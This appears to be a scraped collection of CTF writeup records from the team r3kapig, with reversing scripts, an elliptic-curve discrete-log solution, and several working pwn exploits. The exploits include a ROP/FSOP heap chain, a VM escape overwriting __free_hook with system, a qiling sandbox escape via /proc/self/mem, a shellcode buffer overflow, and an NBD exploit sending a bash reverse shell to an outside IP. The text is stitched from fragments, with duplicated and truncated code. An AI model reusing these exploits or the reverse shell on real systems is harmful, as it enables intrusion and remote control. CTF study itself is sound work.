tables import *\n\n\ndef re_func2(inp: List[int]):\n    table = (0, 13, 10, 7, 4, 1, 14, 11, 8, 5, 2, 15, 12, 9, 6, 3)\n    out = [0] * 16\n    for i in range(16):\n        out[i] = inp[table[i]]\n    return out\n\n\ndef inv_table(tab, val: List[int]):\n    val = (val[0] << 24) | (val[1] << 16) | (val[2] << 8) | val[3]\n    t0 = dict()\n    for i, x in enumerate(tab[0]):\n        for j, y in enumerate(tab[1]):\n            v = x ^ y\n            t0[v] = (i, j)\n    t1 = dict()\n    for i, x in enumerate(tab[2]):\n        for j, y in enumerate(tab[3]):\n            v = x ^ y\n            t1[v] = (i, j)\n    ans = []\n    for v0, pos0 in t0.items():\n        v1 = v0 ^ val\n        if v1 in t1:\n            pos1 = t1[v1]\n            ans.append([*pos0, *pos1])\n    assert len(ans) == 1\n    return ans[0]\n\n\ndef re_func1(inp: List[int]):\n    inp = [t1[i].tolist().index(inp[i]) for i in range(16)]\n    inp = re_func2(inp)\n    for i in reversed(range(9)):\n        for j in reversed(range(0, 16, 4)):\n            tmp = inv_table(table4[i][j:j+4], inp[j:j+4])\n            inp[j:j+4] = inv_table(table3[i][j:j+4], tmp)\n        inp = re_func2(inp)\n    return inp\n\n\nif __name__ == \"__main__\":\n    inp = [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]\n    print(re_func1(inp))\n\ncipher = [148, 59, 143, 112, 121, 186, 106, 133, 55, 90, 164, 166, 167, 121, 174, 147, 148,\n 167, 99, 86, 81, 161, 151, 149, 132, 56, 88, 188, 141, 127, 151, 63]\nfake_cipher = [131, 53, 124, 109, 118, 165, 89, 131, 50, 83, 163, 149, 165, 104, 153, 145, 142, 149, 77, 69, 60, 154, 133, 128, 115, 54, 69, 168, 133, 105, 146, 59]\nfor c, f in zip(cipher, fake_cipher):\n    print (chr(c - f + 48), end='')\n# A6C33EA2571A2AE26BFAE7BEA2CD8F54\n\nimport L\nfrom var import *\n\ndef check_format(flag):\n    if len(flag) != 28:\n        return False\n    for i in flag:\n        if i not in '0123456789abcdef':\n            return False\n\n    return True\n\n\nv1 = L.c1(v1, v2, v3)\nv6 = L.c2(v1, v4, v5)\nk = input('flag:')\nif check_format(k) == True:\n    v2 = L.f3(k)\n    v3 = v2 - v6\n    if v3.a2 == g1 and v3.a3 == g2:\n        print('Congratulations! n1ctf{%s}' + k)\n\nz = ''.join([chr(i ^ 2) for i in z])\nexec(z)\n\nkey = 0\nlibc = ctypes.CDLL(\"libc.so.6\")\n_ptrace = libc.ptrace\nkey=_ptrace(0, 0, 1, 0)\n_memcpy = libc.memcpy\nkey += 1\naddress=id(f1.__code__.co_code)+bytes.__basicsize__-1\ncodes=list(f1.__code__.co_code)\nfor i in range(len(codes)):codes[i]^=key\ncodes=bytearray(codes)\nbuff=(ctypes.c_byte*len(codes)).from_buffer(codes)\n_memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(len(codes)))\n\nimport L\nfrom var import *\n\ndef check_format(flag):\n    if len(flag) != 28:\n        return False\n    for i in flag:\n        if i not in '0123456789abcdef':\n            return False\n    return True\n\nv1 = L.c1(v1, v2, v3)\nv6 = L.c2(v1, v4, v5)\nk = input('flag:')\nif check_format(k) == True:\n    v2 = L.f3(k)\n    v3 = v2 * v6\n    if v3.a2 == g1 and v3.a3 == g2:\n        print('Congratulations! n1ctf{%s}' % k)\n\ndef inv_mod(b, p):\n    if b < 0 or p <= b:\n        b = b % p\n    c, d = b, p\n    uc, vc, ud, vd, temp = 1, 0, 0, 1, 0\n    while c != 0:\n        temp = c\n        q, c, d = d // c, d % c, temp\n        uc, vc, ud, vd = ud - q * uc, vd - q * vc, uc, vc\n\n    assert d == 1\n    if ud > 0:\n        return ud\n    else:\n        return ud + p\n\ndef leftmost_bit(x):\n    assert x > 0\n    result = 1\n    while result <= x:\n        result = 2 * result\n    return result // 2\n\nclass Curve(object):  # c1\n\n    def __init__(self, p, a, b):\n        var4 = p\n        var4 ^= 0x10000000000000000000000000000000000000000L\n        self.p = var4\n        var5 = a\n        var5 -= 1\n        var5 //= 2\n        self.a = var5\n        var6 = b\n        var6 //= 2\n        var6 += 1\n        self.b = var6\n\n    def s1(self, x, y):  # 判断是否在曲线上\n        return (y * y) - (x * x * x + self.a * x + self.b) % self.p == 0\n\n\nclass Point(object):   # c2\n\n    def __init__(self, curve: Curve, x, y, order=None):\n        self.curve = curve\n        self.x = x\n        self.y = y\n        self.order = order\n        if self.a1:\n            assert self.a1.s1(x, y)\n        if order:\n            assert self * order == g1\n\n    def __eq__(self, other):\n        if self.curve == other.curve and self.x == other.x and self.y == other.y:\n            return True\n        else:\n            return False\n\n    def __add__(self, other):\n        if other == g1:\n            return self\n        if self == g1:\n            return other\n        assert self.curve == other.curve\n        if self.x == other.x:\n            if (self.y + other.y) % self.curve.p == 0:\n                return g1\n            return self.s1()\n        p = self.curve.p\n        l = other.y % self.y - inv_mod(other.x % self.x, p) + p\n        x3 = (l * l - self.x - other.x) % p\n        y3 = (l * (self.x - x3) - self.y) % p\n        return Point(self.curve, x3, y3)\n\n    def __mul__(self, other):\n        e = other\n        if self.order:\n            e = e + self.order\n        if e == 0:\n            return g1\n        if self == g1:\n            return g1\n        e3 = 3 * e\n        negative_self = Point(self.curve, self.x, -self.y, self.order)\n        i = leftmost_bit(e3) ** 2\n        result = self\n        while i > 1:\n            result = result.s1()\n            if e3 & i != 0 and e & i == 0:\n                result = result + self\n            if e3 & i == 0 and e & i != 0:\n                result = result + negative_self\n            i = i // 2\n\n        return result\n\n    def __rmul__(self, other):\n        return self * other\n\n    def s1(self):   # double函数\n        if self == g1:\n            return g1\n        p = self.curve.p # 曲线的p\n        a = self.curve.a # 曲线的a\n        l = (3 * self.x * self.x + a) * inv_mod(2 * self.y, p) % p   # 加法的lambda\n        x3 = (l * l) - (2 * self.x) % p                            # 加法的x_3\n        y3 = ((l * (self.x - x3)) - self.y) % p                    # 加法的y_3\n        return Point(self.curve, x3, y3)\n\n\ng1 = Point(None, None, None)   # g1是INFINITY\n\ndef f3(var0):\n    var1 = 0\n    for i in var0[::-1]:\n        var1 = (var1 << 4) | int(i, 16)\n    return var1\n\nimport zlib\nimport tinyaes\n\nkey = 'nu1lnu1lnu1lnu1l'\n\nobj = open('var.pyc.encrypted', 'rb').read()\ncipher = tinyaes.AES(key.encode(), obj[:16])\nobj = cipher.CTR_xcrypt_buffer(obj[16:])\n\nobj = zlib.decompress(obj)\n\nopen('var.pyc', 'wb').write(obj)\n\np = 0xfffffffffffffffffffffffffffffffeffffac73\na = 0xfffffffffffffffffffffffffffffffeffffac71\nb = 0x21\n\nP = (0xf6f8b692899e1b4c5c82580820c2c7cb5597e12e, 0xafb7be2af28b649dab76337b42ee310119413529)\nQ = (0x4945e0d8dc57e88d5949f84bf09943f572dbebb1, 0xb1bf040fe1939c7144341d3af61f36d63f47e272)\n\nF = FiniteField(p)\nE = EllipticCurve(F, [a, b])\nP = E.point(P)\nQ = E.point(Q)\n\nprint(factor(P.order()))\n\nprimes = [2^6, 5, 17, 79, 4457, 40591, 585977563, 1460624777797, 5490618741917]\n\ndlogs = []\nfor fac in primes:\n    t = int(P.order()) // int(fac)\n    dlog = discrete_log(t*Q,t*P, operation=\"+\")\n    dlogs += [dlog]\n    print(\"factor: \"+str(fac)+\", Discrete Log: \"+str(dlog))\n\ncrt(dlogs, primes)\n\n    global p\n    print(pidof(p))\n    raw_input()\n\n\n        context.arch='amd64'\n        rdx = 0x000000000002cdae+base\n        rdi = 0x00000000000152a1+base\n        rsi = 0x000000000007897d+base # rbp\n        rax = 0x0000000000016a96+base\n        leaver = 0x000000000007b088+base\n        sys_read = 0x7f2ea1052f10-0x7f2ea0fde000+base\n        sys_open = 0x7f2ea0ffda70-0x7f2ea0fde000+base\n        sys_write = 0x7f2ea1053700-0x7f2ea0fde000+base\n        rebase = 0x7f2ea10923f8-0x7f2ea0fde000+base\n        syscall = 0x7b3f6+base\n        payload = flat([\n            0,0,\n            0xdeadbeef,\n            0x0000000000016e7e+base,\n            0xb43c0+base,\n            0xb43c0+base-0x40,\n            0xdeadbeef,\n            rsi,\n            rebase,leaver,rdi,0,rdx,0x1000,sys_read,3,4,0xffffffffffffffff\n        ])\n        FSOP = 0xb43a0+base\n        log.warning(\"FSOP->\"+hex(FSOP))\n        add((0xa0+heap) - (bss+0xfa0),0)\n        leave()\n        add((0xa0+heap) - (bss+0xfa0)+0x100,0)\n        read(p64(FSOP-0x30))\n        \n        add(0xd0,1,payload)\n        #ddd()\n        \n        cmd(5)\n        rop=flat([\n        rdi,rebase+0x199,rsi,0,0,rdx,0,rax,2,syscall,\n        rdi,3,rsi,rebase,0,rdx,0x99,sys_read,\n        rdi,1,rsi,rebase,0,rdx,0x99,sys_write\n        ])\n        p.send(rop.ljust(0x199,b'\\0')+b\"./flag\\0\")\n        \n        t=p.readuntil(b\"\\n\")\n        res=p.read()\n        print(res)\n        log.warning(hex(base))\n        raw_input()\n        \n        #gdb.attach(p,'vmmap')\n        p.interactive()\n    except Exception:\n        p.close()\n\n\n    data = unicodedata.normalize('NFKD',data)\n    if len(data) > 1024:\n        return False\n    if re.search(r'__|\\(|\\)|datetime|sys|import',data):\n        return False\n    for k in builtins.__dict__.keys():\n        if k in data:\n            return False\n    return True\n\n\n    def get(self):\n        self.render(\"templates/index.html\",)\n    def post(self):\n        data = self.get_argument(\"data\")\n        if not filter(data):\n            self.finish(\"no no no\")\n        else:\n            id = uuid.uuid4()\n            f = open(f\"uploads/{id}.html\",'w')\n            f.write(data)\n            f.close()\n            try:\n                self.render(f\"uploads/{id}.html\",)\n            except:\n                self.finish(\"error\")\n            os.unlink(f\"uploads/{id}.html\")\n\n\n    def __init__(self, expression: str, line: int, raw: bool = False) -> None:\n        self.expression = expression\n        self.line = line\n        self.raw = raw\n\n\n    def generate(self, writer: \"_CodeWriter\") -> None:\n        writer.write_line(\"_tt_tmp = %s\" % self.expression, self.line) # ⚠vulnerable\n        writer.write_line(\n            \"if isinstance(_tt_tmp, _tt_string_types):\" \" _tt_tmp = _tt_utf8(_tt_tmp)\",\n            self.line,\n        )\n        writer.write_line(\"else: _tt_tmp = _tt_utf8(str(_tt_tmp))\", self.line)\n        if not self.raw and writer.current_template.autoescape is not None:\n            # In python3 functions like xhtml_escape return unicode,\n            # so we have to convert to utf8 again.\n            writer.write_line(\n                \"_tt_tmp = _tt_utf8(%s(_tt_tmp))\" % writer.current_template.autoescape, # ⚠vulnerable\n                self.line,\n            )\n        writer.write_line(\"_tt_append(_tt_tmp)\", self.line)\n\n\n    global g_fp\n    g_fp.write(code+'\\n')\n    print(code)\n\n\n    global keyreg\n    opreg=''\n    val_idx=0\n    if print_operand(ip,1)==keyreg:\n        opreg=print_operand(ip,2)\n        val_idx=2\n    else:\n        if print_operand(ip,2)!=keyreg:\n            myexit()\n        opreg=print_operand(ip,1)\n        val_idx=1\n    if opreg.find('rbp')!=-1:\n        rbp_off=get_operand_value(ip,val_idx)\n        rbp_off=struct.unpack('q',struct.pack('Q',rbp_off))[0]\n        rbp=ida_dbg.get_reg_val('rbp')\n        data_pos=rbp+rbp_off\n        bdata=ida_bytes.get_bytes(data_pos,16)\n        return cvt_xmmi(bdata)\n    else:\n        return cvt_xmmi(ida_dbg.get_reg_val(opreg))\n\n\n    global keyreg\n    if print_operand(ip,1)!=keyreg:\n        myexit()\n    opreg=print_operand(ip,2)\n    if opreg.find('rbp')!=-1:\n        rbp_off=get_operand_value(ip,2)\n        rbp_off=struct.unpack('q',struct.pack('Q',rbp_off))[0]\n        rbp=ida_dbg.get_reg_val('rbp')\n        data_pos=rbp+rbp_off\n        bdata=ida_bytes.get_bytes(data_pos,16)\n        return cvt_xmmi(bdata)\n    else:\n        return cvt_xmmi(ida_dbg.get_reg_val(opreg))\n\n\n    global keyreg\n    xmmi=prase_opxmmi(ip)\n    if print_operand(ip,1)!=keyreg:\n        myexit()\n    else:\n        log_code('dst=subq(dst,'+xmmi+');')\n\n\n    if ip == 0x7FF6C0AD88FA:\n            myexit()\n    ip=ida_dbg.get_reg_val(\"rip\")\n    #print(hex(ip)[2:])\n    dis=GetDisasm(ip)\n    mnem=print_insn_mnem(ip)\n    if print_operand(ip,0)==keyreg:\n        if mnem == 'vmovdqa':\n            break\n        if mnem == 'vpxor':\n            prase_vpxor(ip)\n        elif mnem == 'vpshufd':\n            prase_vpshufd(ip)\n        elif mnem == 'vpaddq':\n            prase_vpaddq(ip)\n        elif mnem == 'vpsubq':\n            prase_vpsubq(ip)\n        elif mnem == 'vaesenc':\n            prase_vaesenc(ip)\n        elif mnem == 'vaesenclast':\n            prase_vaesenclast(ip)\n        elif mnem == 'vaesdec':\n            prase_vaesdec(ip)\n        elif mnem == 'vaesdeclast':\n            prase_vaesdeclast(ip)\n        elif mnem == 'vaesimc':\n            break\n        else:\n            break\n        \n    ida_dbg.step_over()\n    ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP,2)\n\n\n    int hits[4] = { 0 };\n    for (int i = 0; i < 4; i++) {\n        hits[ord_off[i]] = 1;\n    }\n    for (int i = 0; i < 4; i++) {\n        if (hits[i] == 0) {\n            printf(\"invaild pshufd ord\\n\");\n            exit(1);\n        }\n    }\n    __m128i result = { 0 };\n    for (int i = 0; i < 4; i++) {\n        ((int*)&result)[ord_off[i]] = ((int*)&v)[i];\n    }\n    return result;\n\n\n    inp = [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]\n    print(re_func1(inp))\n\n\n    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna say goodbye $($code:tt)*)) => {\n        $Gonna = $Never[$Give];\n        println!(\"Gonna = Never[Give: {}]: {}\", $Give, $Never[$Give]);\n        check!(@e ($Never,$Gonna,$Give); ($($code)*));\n    };\n    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna tell a lie and hurt you $($code:tt)*)) => {\n        $Never[$Give] = $Gonna;\n        println!(\"Never[Give: {}] = Gonna: {}\", $Give, $Gonna);\n        check!(@e ($Never,$Gonna,$Give); ($($code)*));\n    };\n\n\n    print (chr(c - f + 48), end='')\n\n\n    v2 = L.f3(k)\n    v3 = v2 - v6\n    if v3.a2 == g1 and v3.a3 == g2:\n        print('Congratulations! n1ctf{%s}' + k)\n\n\n    v2 = L.f3(k)\n    v3 = v2 * v6\n    if v3.a2 == g1 and v3.a3 == g2:\n        print('Congratulations! n1ctf{%s}' % k)\n\n\n    def __init__(self, p, a, b):\n        var4 = p\n        var4 ^= 0x10000000000000000000000000000000000000000L\n        self.p = var4\n        var5 = a\n        var5 -= 1\n        var5 //= 2\n        self.a = var5\n        var6 = b\n        var6 //= 2\n        var6 += 1\n        self.b = var6\n\n\n    def s1(self, x, y):  # 判断是否在曲线上\n        return (y * y) - (x * x * x + self.a * x + self.b) % self.p == 0\n\n\n    def __init__(self, curve: Curve, x, y, order=None):\n        self.curve = curve\n        self.x = x\n        self.y = y\n        self.order = order\n        if self.a1:\n            assert self.a1.s1(x, y)\n        if order:\n            assert self * order == g1\n\n\n    def __eq__(self, other):\n        if self.curve == other.curve and self.x == other.x and self.y == other.y:\n            return True\n        else:\n            return False\n\n\n    def __add__(self, other):\n        if other == g1:\n            return self\n        if self == g1:\n            return other\n        assert self.curve == other.curve\n        if self.x == other.x:\n            if (self.y + other.y) % self.curve.p == 0:\n                return g1\n            return self.s1()\n        p = self.curve.p\n        l = other.y % self.y - inv_mod(other.x % self.x, p) + p\n        x3 = (l * l - self.x - other.x) % p\n        y3 = (l * (self.x - x3) - self.y) % p\n        return Point(self.curve, x3, y3)\n\n\n    def __mul__(self, other):\n        e = other\n        if self.order:\n            e = e + self.order\n        if e == 0:\n            return g1\n        if self == g1:\n            return g1\n        e3 = 3 * e\n        negative_self = Point(self.curve, self.x, -self.y, self.order)\n        i = leftmost_bit(e3) ** 2\n        result = self\n        while i > 1:\n            result = result.s1()\n            if e3 & i != 0 and e & i == 0:\n                result = result + self\n            if e3 & i == 0 and e & i != 0:\n                result = result + negative_self\n            i = i // 2\n\n\n    def __rmul__(self, other):\n        return self * other\n\n\n    def s1(self):   # double函数\n        if self == g1:\n            return g1\n        p = self.curve.p # 曲线的p\n        a = self.curve.a # 曲线的a\n        l = (3 * self.x * self.x + a) * inv_mod(2 * self.y, p) % p   # 加法的lambda\n        x3 = (l * l) - (2 * self.x) % p                            # 加法的x_3\n        y3 = ((l * (self.x - x3)) - self.y) % p                    # 加法的y_3\n        return Point(self.curve, x3, y3)\n\n\n    t = int(P.order()) // int(fac)\n    dlog = discrete_log(t*Q,t*P, operation=\"+\")\n    dlogs += [dlog]\n    print(\"factor: \"+str(fac)+\", Discrete Log: \"+str(dlog))\n", "tools": ["sage", "python", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20211122-n1ctf\\README.md", "file_size": 32632, "scraped_at": "2025-10-26T18:19:26.757834"}
{"id": "r3kapig_writeup_RealWorld_CTF_4th_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "RealWorld CTF 4th Writeup", "attack_type": "AES", "writeup": "# RealWorld CTF 4th Writeup\n\n## 前言\n\n本次比赛取得了第四名的成绩,现将师傅们的wp整理如下,与大家交流学习.有意向的师傅欢迎投递简历到root@r3kapig.com.\n\n![](https://i.imgur.com/22o9aCw.png)\n\n## Pwn\n\n### SVME\n\n无检测的虚拟机\n- 不断利用LOAD，STORE，GLOAD，GSTORE得到栈地址，栈空间中的libc地址\n- 利用计算指令计算出__free_hook-8和system的地址\n- 最后结束的时候触发free -> *__free_hook(&__free_hook-8)实现getshell\n\n```python \nfrom pwn import *\n\ncontext.log_level = \"debug\"\ncontext.binary = \"./svme\"\n\n'''\ntypedef enum {\n    NOOP    = 0,\n    IADD    = 1,   // int add\n    ISUB    = 2,\n    IMUL    = 3,\n    ILT     = 4,   // int less than\n    IEQ     = 5,   // int equal\n    BR      = 6,   // branch\n    BRT     = 7,   // branch if true\n    BRF     = 8,   // branch if true\n    ICONST  = 9,   // push constant integer\n    LOAD    = 10,  // load from local context\n    GLOAD   = 11,  // load from global memory\n    STORE   = 12,  // store in local context\n    GSTORE  = 13,  // store in global memory\n    PRINT   = 14,  // print stack top\n    POP     = 15,  // throw away top of stack\n    CALL    = 16,  // call function at address with nargs,nlocals\n    RET     = 17,  // return value from function\n    HALT    = 18\n} VM_CODE;\n'''\n\n#p = process(\"./svme\")\n#base = p.libs()[\"/media/psf/Home/Documents/2022-CTF/realworldctf-2022/pwn-SVME/svme_9495bfd34dcaea7af748f1138d5fc25e/svme\"]\n\nIP, PORT = \"47.243.140.252\", 1337\np = remote(IP, PORT)\n# opcode\nGSTORE = 13 # gstore, offset\nPOP = 15    # pop\nGLOAD = 11  # gload, offset\nLOAD = 10   # load, offset\nSTORE = 12  # store, offset\nPUSH = ICONST = 9 # push, data\nADD = IADD = 1 # add\nHALT = 18\n\n# debug mode\ncmd = \"\"\n#cmd = \"b *%d\\n\" %(base+0x137e) # loop\n#cmd += \"b *%d\\n\" %(base+0x1d58) # vm_exec\n#cmd = \"set $a=0x5555555592a0\\n\" # vm's address\n#cmd += \"b *%d\\n\" %(base+0x194C) # before exit\n#gdb.attach(p, cmd)\n\n# payload opcode \ncode = p32(POP)*1\ncode += p32(GSTORE) + p32(1)\ncode += p32(GSTORE) + p32(0)\n\ncode += p32(GSTORE) + p32(3)\ncode += p32(GSTORE) + p32(2)\n\ncode += p32(GSTORE) + p32(5)\ncode += p32(GSTORE) + p32(4)\n\n# gstore balance\ncode += p32(GLOAD) + p32(4)\ncode += p32(GLOAD) + p32(5)\n\ncode += p32(GLOAD) + p32(2)\ncode += p32(GLOAD) + p32(3)\n\ncode += p32(GLOAD) + p32(0)\ncode += p32(GLOAD) + p32(1)\n\n# load stack ptr data (in gloabl area) to stack area\ncode += p32(GLOAD) + p32(4)\ncode += p32(GLOAD) + p32(5)\n\n# change global ptr\ncode += p32(STORE) + p32(-992&0xffffffff)\ncode += p32(STORE) + p32(-993&0xffffffff)\n\n# store balance\ncode += p32(LOAD) + p32(-993&0xffffffff)\ncode += p32(LOAD) + p32(-992&0xffffffff)\n\n\n# load libc address(in global area -> program stack) to stack area\n# reverse data for calc\ncode += p32(GLOAD) + p32(0x87)\ncode += p32(GLOAD) + p32(0x86)\n\n# calc system and __free_hook address offset\n'''\nleak         =>  0x7ffff7dea0b3\nsystem       =>  0x7ffff7e18410\n__free_hook-8  =>  0x7ffff7fb1b20 \n'''\n\n# calc system address\ncode += p32(PUSH) + p32(0x7ffff7e18410-0x7ffff7dea0b3)\ncode += p32(ADD)\n\n# calc __free_hook_address\ncode += p32(GLOAD) + p32(0x86)\ncode += p32(PUSH) + p32(0x7ffff7fb1b20-0x7ffff7dea0b3)\ncode += p32(ADD)\n\n\n# global area -> &__free_hook\ncode += p32(STORE) + p32(-993&0xffffffff)\ncode += p32(STORE) + p32(-990&0xffffffff)\ncode += p32(STORE) + p32(-992&0xffffffff)\n\ncode += p32(LOAD) + p32(-992&0xffffffff)\ncode += p32(LOAD) + p32(-990&0xffffffff)\n\ncode += p32(GSTORE) + p32(2)\ncode += p32(GSTORE) + p32(3)\n\n# /bin/sh\\x00 => 0x68732f6e69622f\ncode += p32(PUSH) + p32(0x6e69622f)\ncode += p32(PUSH) + p32(0x68732f)\n\ncode += p32(GSTORE) + p32(1)\ncode += p32(GSTORE) + p32(0)\n\n# nop padding\ncode += p32(HALT)\n\ncode = code.ljust(512, b\"\\x00\")\n\np.send(code)\n\np.interactive()\n```\n\n### QLaaS\n\n题目接收一个可执行文件，并在qiling环境中执行。题目考察点在qiling环境的逃逸。\nqiling是基于unicorn的实现的二进制程序执行环境，自己实现了syscall、binary loader等操作，使其能够跨架构、跨平台执行可执行程序。\n通过代码审计可以发现，其实现openat系统调用时缺少对路径穿越的判断，从而可以绕出rootfs。\n利用路径穿越，我们可以对/proc/self/mem进行读写并getshell\n\nexp.c:\n\n```c \n#include <string.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdlib.h>\n\n\nint ql_open(char* abs_path, long flag){\n        int fd,dir_fd;\n\n        char path[128] = \"../../../../../../../..\";\n        strcat(path, abs_path);\n        printf(\"path for qiling is %s\\n\",path);\n        dir_fd  = syscall(2,\".\",O_RDONLY,0666);\n        fd  = syscall(257,dir_fd, path ,flag,0666);\n        close(dir_fd);\n        return fd;\n}\nint main(){\n        int  fd;\n        int file_size;\n        unsigned long ret,off;\n        char buf[30000];\n        fd  = ql_open(\"/proc/self/maps\",O_RDONLY);\n        memset(buf,0,sizeof(buf));\n        read(fd,buf,12);\n\n        off = strtol(buf, (char*)buf+12, 16);\n        printf(\"python offset = %lx\\n\",off);\n        read(fd,&buf[12],40960);\n        puts(buf);\n        close(fd);\n\n        fd = ql_open(\"/proc/self/mem\",O_RDWR);\n        ret = lseek(fd, off+0x3FF8,SEEK_SET);\n        printf(\"seek set ret = %lx\\n\",ret);\n        unsigned long cxaf_addr = 0;\n        read(fd,&cxaf_addr,8);\n        printf(\"__cxa_finalize = %lx\\n\",cxaf_addr);\n\n\n        unsigned long libc_addr = cxaf_addr - 0x3ea00 ;\n        unsigned lo", "solution_code": "from pwn import *\n\ndebug = 0\ncontext.log_level = 'debug'\n# 0x000093fc 0x9270 0x9294\nbase = 0x13f510\nif debug:\n    p = remote('192.168.101.23', 8554)\nelse:\n    p = remote('47.242.246.203', 32042)\n#    p.sendlineafter(':', '{Team_token}')\n\nsc = [\n    0x23, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x82, 0xB8, 0x3B, 0x6E, 0x25, 0x16,\n    0x68, 0xE4, 0x13, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x66, 0x32, 0x41, 0xA3,\n    0x68, 0xE4, 0x13, 0x10, 0x6C, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x61, 0x32, 0x43, 0xA3,\n    0x68, 0xE4, 0x13, 0x10, 0x67, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x32, 0x45, 0xA3,\n    0x88, 0xE4, 0x03, 0x10, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x30, 0x4F, 0x6C, 0x63, 0x28, 0x38, 0x37,\n    0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x00, 0xB4, 0x28, 0xE4, 0x13, 0x11, 0x68, 0xE4, 0x03, 0x10,\n    0x02, 0xEA, 0x00, 0x01, 0x00, 0x93, 0x3F, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x68, 0xE4,\n    0x13, 0x11, 0x02, 0xEA, 0x00, 0x10, 0x4F, 0x6C, 0x04, 0x30, 0x40, 0x37, 0x00, 0xC0, 0x20, 0x20,\n    0x00, 0x6C, 0xA3, 0x6F, 0x82, 0x98, 0xEE, 0xD9, 0x01, 0x20, 0x0E, 0xD9, 0x00, 0x20, 0x03, 0x14,\n\n    # useless shellcode just for stucking process, used to launch shell\n    0x22, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x3B, 0x6E, 0x2A, 0x14, 0x68, 0xE4,\n    0x0F, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x41, 0xA3, 0x68, 0xE4,\n    0x0F, 0x10, 0x69, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x6E, 0x32, 0x43, 0xA3, 0x68, 0xE4,\n    0x0F, 0x10, 0x2F, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x45, 0xA3, 0x68, 0xE4,\n    0x0F, 0x10, 0x75, 0x32, 0x46, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x73, 0x32, 0x47, 0xA3, 0x68, 0xE4,\n    0x0F, 0x10, 0x79, 0x32, 0x48, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x49, 0xA3, 0x68, 0xE4,\n    0x0F, 0x10, 0x6F, 0x32, 0x4A, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x78, 0x32, 0x4B, 0xA3, 0x68, 0xE4,\n    0x0F, 0x10, 0x00, 0x32, 0x4C, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x73, 0x32, 0x40, 0xA3, 0x68, 0xE4,\n    0x17, 0x10, 0x68, 0x32, 0x41, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x00, 0x32, 0x42, 0xA3, 0x68, 0xE4,\n    0x23, 0x10, 0x48, 0xE4, 0x0F, 0x10, 0x40, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x48, 0xE4, 0x17, 0x10,\n    0x41, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x00, 0x32, 0x42, 0xB3, 0x68, 0xE4, 0x27, 0x10, 0x00, 0x32,\n    0x40, 0xB3, 0x48, 0xE4, 0x27, 0x10, 0x28, 0xE4, 0x23, 0x10, 0x68, 0xE4, 0x0F, 0x10, 0x0F, 0x6C,\n    0xE0, 0xB8, 0xDD, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x02, 0x14, 0x3C, 0x78\n]\n\ntest = b'Oclient_port' + b'a' * 1273 + p32(0x13fa1c)[:3] + b'\\r\\nbb' + bytearray(sc) + b'\\r\\n'\n\np.send(test)\n# p.sendline(test)\np.interactive()\n\nfrom code import interact\nfrom distutils.dir_util import copy_tree\nfrom re import sub\nfrom pwn import *\nimport subprocess\n#context.log_level = 'debug'\ncontext.arch='amd64'\nDEBUG = 0\nif(DEBUG):\n    ip = \"0.0.0.0\"\n    port = 6666\nelse:\n    ip = \"47.242.113.232\"\n    port =49265\np = None\nru = lambda x: p.recvuntil(x)\nrl = lambda  : p.recvline()\nra = lambda  : p.recvall()\nrv = lambda x: p.recv(x)\nsn = lambda x: p.send(x)\nsl = lambda x: p.sendline(x) \nsa = lambda x,y: p.sendafter(x,y) \ndef pow():\n    ru('sha256(\"')\n    tmp = ru('\"')[:-1].decode()\n    c1 = \"gcc ./pow.c -lcrypto -o ppp\".split(' ')\n    c2 = f\"./ppp {tmp}\".split(' ')\n    c3 = \"rm ./ppp\".split(' ')\n    subp = subprocess.Popen(c1)\n    subp.wait()\n    print(c2)\n    subp = subprocess.Popen(c2)\n    res,_ = subp.communicate()\n    subp = subprocess.Popen(c3)\n    subp.wait()\n    print(res,_)\ndef anum(n):\n    sn(p32(n,endian='big'))\ndef NBD_OPT_EXPORT_NAME(payload):\n    anum(1)\n    anum(len(payload))\n    sn(payload)\ndef NBD_OPT_LIST():#baned\n    sn(p64(0x54504f4556414849))\n    anum(3)\n    anum(1)    \ndef NBD_OPT_STARTTLS(size,c):#Set stack\n    anum(5)\n    anum(size)\n    sn(c)\ndef NBD_OPT_INFO(buf):\n    anum(7)\n    anum(len(buf)+4)\n    anum(len(buf)+4)\n    sn(buf)\n    p.read()\n    pad = b\" \"*0x10+b'''sleep 3;bash -c 'exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1';'''*0x6\n    sn(pad.ljust(len(buf)+4,b'\\0'))\n    sn(p16(0,endian='big'))\n    p.readuntil(\"nown\")\ndef single_req(base,guess):\n    global p\n    p = remote(ip,port)\n    sa(\"OPT\\x00\\x03\",p32(0))\n    sn(p64(0x54504f4556414849))\n    NBD_OPT_INFO(base+guess)\n    p.read(timeout=1)\ndef req(base,length):\n    res = b\"\"\n    global p\n    for 